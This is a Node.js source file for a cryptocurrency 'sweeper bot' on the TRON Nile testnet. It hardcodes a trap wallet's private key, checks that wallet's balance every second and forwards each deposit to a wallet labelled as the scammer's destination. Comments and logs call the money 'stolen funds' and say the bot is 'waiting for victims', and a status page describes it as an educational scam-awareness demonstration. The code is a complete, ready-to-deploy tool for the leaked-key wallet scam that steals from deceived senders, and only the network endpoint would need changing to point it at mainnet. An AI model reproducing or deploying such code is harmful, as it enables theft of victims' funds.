// =====================================================
// SWEEPER BOT - RENDER DEPLOYMENT
// NILE TESTNET - SPEED OPTIMIZED
// =====================================================

const { TronWeb } = require('tronweb');
const express = require('express');

// =====================================================
// ⚠️ CONFIGURATION - REPLACE WITH YOUR WALLETS
// =====================================================

// YOUR TRAP WALLET PRIVATE KEY (from TronLink/OKX)
const TRAP_PRIVATE_KEY = '18A63D617F8214CA198330327FF54D0743BCBDB3CAB531EFAD1813598C4221DB';

// YOUR REAL WALLET ADDRESS (where stolen TRX goes)
const SCAMMER_DESTINATION = 'TTbU7eN9XPP8i6WT6QXy5wus5gBJey8A15';

// =====================================================
// CONNECT TO NILE TESTNET
// =====================================================

// Use multiple RPC endpoints for redundancy and speed
const tronWeb = new TronWeb({
    fullHost: 'https://nile.trongrid.io',
    solidityNode: 'https://nile.trongrid.io',
    eventServer: 'https://nile.trongrid.io',
    privateKey: TRAP_PRIVATE_KEY
});

// Get the trap wallet address from the private key
const TRAP_ADDRESS = tronWeb.address.fromPrivateKey(TRAP_PRIVATE_KEY);

// Minimum amount to sweep (1 TRX = 1,000,000 SUN)
const MIN_SWEEP_AMOUNT_SUN = 1000000;

// Track last sweep to prevent duplicates
let lastSweepTime = 0;
let lastBalance = 0;
let sweepInProgress = false;

console.log('═══════════════════════════════════════');
console.log('⚡ SWEEPER BOT - NILE TESTNET');
console.log('═══════════════════════════════════════');
console.log('📡 Watching trap wallet:', TRAP_ADDRESS);
console.log('🎯 Sending stolen funds to:', SCAMMER_DESTINATION);
console.log('⏰ Checking every 1 second...');
console.log('═══════════════════════════════════════');

// =====================================================
// THE SWEEP FUNCTION (Runs every 1 second)
// =====================================================

async function sweep() {
    // Prevent multiple sweeps from running simultaneously
    if (sweepInProgress) {
        return;
    }

    try {
        sweepInProgress = true;

        // Get the current balance
        const balance = await tronWeb.trx.getBalance(TRAP_ADDRESS);
        const balanceTrx = balance / 1000000;

        // Log if balance has changed
        if (balanceTrx !== lastBalance) {
            console.log(`📊 [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx.toFixed(2)} TRX`);
            lastBalance = balanceTrx;
        }

        // If balance is above minimum and not a duplicate sweep
        if (balance > MIN_SWEEP_AMOUNT_SUN) {
            const currentTime = Date.now();

            // Prevent duplicate sweeps within 5 seconds
            if (currentTime - lastSweepTime < 5000) {
                console.log(`⏳ [${new Date().toLocaleTimeString()}] Cooldown, waiting for new deposit...`);
                return;
            }

            console.log(`\n🚨 [${new Date().toLocaleTimeString()}] Balance: ${balanceTrx.toFixed(2)} TRX - SWEEPING!`);

            // Leave 0.2 TRX for fees
            const feeBuffer = 200000; // 0.2 TRX
            const amountToSend = balance - feeBuffer;

            if (amountToSend > 0) {
                // BROADCAST IMMEDIATELY - Don't wait for confirmation
                const txid = await tronWeb.trx.sendTransaction(
                    SCAMMER_DESTINATION,
                    amountToSend
                );

                console.log(`✅ [${new Date().toLocaleTimeString()}] SWEPT ${(amountToSend / 1000000).toFixed(2)} TRX!`);
                console.log(`📝 Transaction ID: ${txid}`);
                console.log(`💰 New balance: 0 TRX`);

                // Update tracking
                lastSweepTime = currentTime;
                lastBalance = 0;
            } else {
                console.log(`⚠️ [${new Date().toLocaleTimeString()}] Balance too low after fees.`);
            }
        }
    } catch (error) {
        console.error(`❌ ERROR [${new Date().toLocaleTimeString()}]:`, error.message);
    } finally {
        sweepInProgress = false;
    }
}

// =====================================================
// FAST POLLING - CHECK EVERY 1 SECOND
// =====================================================

// Run sweep immediately on startup
sweep();

// Then check every 1 second
setInterval(sweep, 1000);

console.log('⏳ Bot is alive and waiting for victims...\n');

// =====================================================
// WEB SERVER - KEEPS BOT ALIVE ON RENDER
// =====================================================

const app = express();
const PORT = process.env.PORT || 3000;

// Health check endpoint
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Main status page
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>⚡ Sweeper Bot - Nile Testnet</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
                .info { background: #f4f4f4; padding: 15px; border-radius: 8px; }
                .status { color: green; font-weight: bold; }
                .address { font-family: monospace; word-break: break-all; background: #fff; padding: 5px; }
                .highlight { background: #ff6b6b; color: white; padding: 2px 8px; border-radius: 4px; }
            </style>
        </head>
        <body>
            <h1>⚡ Sweeper Bot (Nile Testnet)</h1>
            <div class="info">
                <p><strong>Network:</strong> 🌐 Nile Testnet</p>
                <p><strong>Trap Wallet:</strong> <span class="address">${TRAP_ADDRESS}</span></p>
                <p><strong>Destination Wallet:</strong> <span class="address">${SCAMMER_DESTINATION}</span></p>
                <p><strong>Status:</strong> <span class="status">🟢 Watching (1 second intervals)</span></p>
                <p><strong>Check Speed:</strong> Every 1 second</p>
                <p><strong>⚠️ Warning:</strong> This is an <span class="highlight">EDUCATIONAL</span> demonstration for crypto scam awareness.</p>
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🌐 Web server running on port ${PORT}`);
});

console.log('═══════════════════════════════════════');
console.log('✅ BOT FULLY INITIALIZED - READY');
console.log('═══════════════════════════════════════');
